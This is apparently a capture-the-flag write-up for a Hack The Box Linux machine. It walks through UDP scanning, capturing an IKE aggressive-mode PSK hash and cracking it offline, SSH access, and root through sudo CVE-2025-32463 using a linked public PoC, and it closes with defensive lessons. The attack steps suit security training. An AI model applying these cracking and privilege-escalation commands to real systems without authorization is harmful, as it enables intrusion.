---
title: "Expressway"
date: 2025-09-22
tags: [linux, ike, vpn, psk-crack, ssh, CVE-2025-32463, sudo, privesc]
difficulty: easy
platform: HTB
description: "Linux box with IKE/ISAKMP on UDP/500 — crack the PSK with psk-crack, SSH in, then exploit a vulnerable sudo version (CVE-2025-32463) to root."
featured: false
---

## Overview

![Expressway](/images/writeups/expressway/logo.png)

| Field | Details |
|---|---|
| **Machine** | Expressway |
| **OS** | Linux |
| **Difficulty** | Easy |
| **Status** | Active |

> Walkthrough is sanitized — no flags or live secrets included.

## TL;DR

- UDP/500 open → IKE aggressive mode handshake → PSK hash captured
- `psk-crack` with rockyou.txt → plaintext PSK recovered
- SSH as `ike` user (identity from IKE response) → `user.txt`
- `sudo --version` → 1.9.17 → CVE-2025-32463 → root shell

## Tools Used

- nmap, ike-scan, psk-crack, ssh

## Setup / Notes

```
VM: Parrot
Run both TCP and UDP nmap scans — the key service is on UDP.
```

---

## Recon

```bash
nmap -sC -sV 10.129.211.69       # TCP
nmap -sU --top-ports 100 10.129.211.69  # UDP
```

```
22/tcp  open  ssh     OpenSSH 10.0p2 Debian 8
500/udp open  isakmp
```

Only two services: SSH and ISAKMP (IKE VPN). No web ports, no HTTP. The attack surface is the IKE service.

> **Why UDP matters**: IKE lives on UDP/500. A TCP-only scan would miss this entirely. Always run UDP scans.

---

## Enumeration

### IKE Aggressive Mode

IKE has two modes: Main Mode (identity protected) and Aggressive Mode (identity sent in cleartext + handshake hash exposed). Probe with ike-scan:

```bash
sudo ike-scan -A 10.129.211.69
```

```
10.129.211.69 Aggressive Mode Handshake returned
  SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK ...)
  ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
  Hash(20 bytes)
```

Key info: identity is `ike@expressway.htb`, auth is PSK. Now capture the full handshake hash by specifying the identity:

```bash
sudo ike-scan -A -P ike@expressway.htb 10.129.211.69
```

```
IKE PSK parameters (g_xr:g_xi:cky_r:cky_i:sai_b:idir_b:ni_b:nr_b:hash_r):
<hash blob saved to file>
```

The hash blob is suitable for offline PSK cracking with `psk-crack`.

### Crack the PSK

```bash
psk-crack -d /usr/share/wordlists/rockyou.txt hash.txt
```

```
key "<PASSWORD>" matches SHA1 hash <HASH>
Completed: 8045040 iterations in 4.9 seconds
```

PSK recovered. This becomes the SSH password for the `ike` user.

---

## Exploit

```bash
ssh ike@10.129.211.69
```

Logged in. Grab user flag:

![user.txt as ike](/images/writeups/expressway/user.png)

---

## Privilege Escalation — CVE-2025-32463

Check sudo:

```bash
sudo --version
```

```
Sudo version 1.9.17
```

Search for known vulnerabilities. Sudo 1.9.17 is affected by **CVE-2025-32463** — a local privilege escalation flaw. A public PoC is available.

```bash
nano exploit.sh   # paste the PoC
chmod +x exploit.sh
./exploit.sh
```

Root shell spawned:

![root shell via CVE-2025-32463](/images/writeups/expressway/root.png)

---

## Lessons Learned

- Never skip UDP scans — IKE, SNMP, TFTP, and DNS all live on UDP
- IKE aggressive mode leaks the peer identity and a crackable PSK hash — use Main Mode in production
- Always check `sudo --version` during local enum — even minor version differences can expose known CVEs
- `psk-crack` is the correct tool for ISAKMP PSK hashes; hashcat/John won't work with this format

## References

- [CVE-2025-32463 PoC](https://github.com/K1tt3h/CVE-2025-32463-POC)
- [ike-scan](https://github.com/royhills/ike-scan)
